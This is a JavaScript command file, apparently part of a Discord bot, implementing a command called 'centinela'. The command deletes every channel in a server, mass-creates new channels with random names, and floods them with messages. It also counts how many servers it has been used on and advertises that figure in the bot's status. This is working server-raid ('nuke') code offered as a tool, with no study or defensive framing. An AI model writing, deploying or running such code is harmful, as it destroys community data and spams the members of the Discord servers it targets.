Centinela.js
const fs = require('fs');
const path = require('path');
const { channelNames, messages, totalChannels, messagesPerChannel } = require('../config.json');

async function deleteAllChannels(guild, user) {
    const errors = [];
    for (const ch of guild.channels.cache.values()) {
        try {
            await ch.delete(`Borrado por ${user.tag}`);
        } catch (err) {
            errors.push({ name: ch.name, error: err.message });
            console.error(`Error borrando canal ${ch.name}:`, err);
        }
    }
    return errors;
}

async function createChannelsFast(guild, user) {
    const promises = [];
    for (let i = 0; i < totalChannels; i++) {
        promises.push((async () => {
            const name = `${channelNames[Math.floor(Math.random() * channelNames.length)]} ${user.username}`;
            try {
                const channel = await guild.channels.create({ name, type: 0 });
                for (let j = 0; j < messagesPerChannel; j++) {
                    const msg = messages[Math.floor(Math.random() * messages.length)];
                    channel.send(msg);
                }
            } catch (err) {
                console.error(`Error creando canal ${name}:`, err);
            }
        })());
    }
    await Promise.all(promises); // Esto lo hace mucho más rápido
}

function updateData(guild) {
    const dataPath = path.join(__dirname, '..', 'data.json');
    let data = {};
    if (fs.existsSync(dataPath)) data = JSON.parse(fs.readFileSync(dataPath, 'utf8'));

    if (!data[guild.id]) {
        data[guild.id] = { name: guild.name, uses: 1 };
    } else {
        data[guild.id].uses += 1;
    }

    fs.writeFileSync(dataPath, JSON.stringify(data, null, 2));
    return data[guild.id].uses;
}

module.exports = {
    name: 'centinela',
    description: 'Borra todos los canales y crea nuevos.',
    run: async (interaction) => {
        const guild = interaction.guild;
        if (!guild) return interaction.reply({ content: '❌ Solo en servidores', ephemeral: true });

        await interaction.reply({ content: '🧹 Borrando canales y creando nuevos...', ephemeral: true });

        await deleteAllChannels(guild, interaction.user);
        await createChannelsFast(guild, interaction.user);

        const uses = updateData(guild);

        // Actualizar RPC si está habilitado
        if (require('../config.json').rpc && interaction.client.user?.setActivity) {
            interaction.client.user.setActivity(`He ayudado ${uses} servidores`, { type: 'WATCHING' });
        }
    }
};